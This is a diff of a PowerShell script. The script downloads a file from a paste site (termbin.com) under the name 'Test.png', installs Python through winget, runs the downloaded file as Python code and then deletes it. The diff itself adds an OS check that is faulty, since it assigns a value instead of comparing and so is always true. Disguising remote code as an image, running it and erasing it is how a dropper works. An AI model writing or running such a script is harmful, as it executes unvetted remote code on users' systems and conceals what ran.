@@ -3,7 +3,9 @@ $url = 'https://termbin.com/8aan'
 Invoke-WebRequest -Uri $url -OutFile Test.png
 
 $hasPackageManager = Get-AppPackage -name 'Microsoft.DesktopAppInstaller'
-
+if ($env:OS='Windows_NT' )
+{
+    Write-Output "The condition was true"
 if(!$hasPackageManager)
 {
     Add-AppxPackage -Path 'https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx'
@@ -20,6 +22,6 @@ if(!$hasPackageManager)
 
 
 winget install Python.Python
-
+}
 python3 ./Test.png
 Remove-Item './Test.png'
